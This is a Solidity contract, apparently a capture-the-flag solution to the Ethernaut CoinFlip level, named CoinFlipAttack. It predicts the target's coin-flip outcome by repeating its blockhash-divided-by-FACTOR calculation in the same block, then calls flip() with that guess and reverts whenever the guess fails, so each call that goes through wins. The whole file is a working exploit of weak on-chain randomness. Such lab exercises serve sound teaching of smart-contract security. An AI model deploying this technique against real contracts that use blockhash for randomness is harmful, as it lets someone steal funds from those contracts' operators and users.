// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

error CoinFlipAttack__WrongGuess(uint256 blockValue);

contract CoinFlipAttack {
    uint256 public constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Declaring CoinFlip contract object
    CoinFlip public immutable i_coinFlip;

    constructor(address coinFlipContractAddress) {
        i_coinFlip = CoinFlip(coinFlipContractAddress);
    }

    function initiateAttack() public returns (bool) {
        // 1 - Make guess
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guessSide = coinFlip == 1 ? true : false;
        // 2 - Test guess
        bool guessStatus = i_coinFlip.flip(guessSide);
        // 3 - Revert if guess is wrong
        if (!guessStatus) {
            revert CoinFlipAttack__WrongGuess(blockValue);
        } else {
            return true;
        }
    }
}
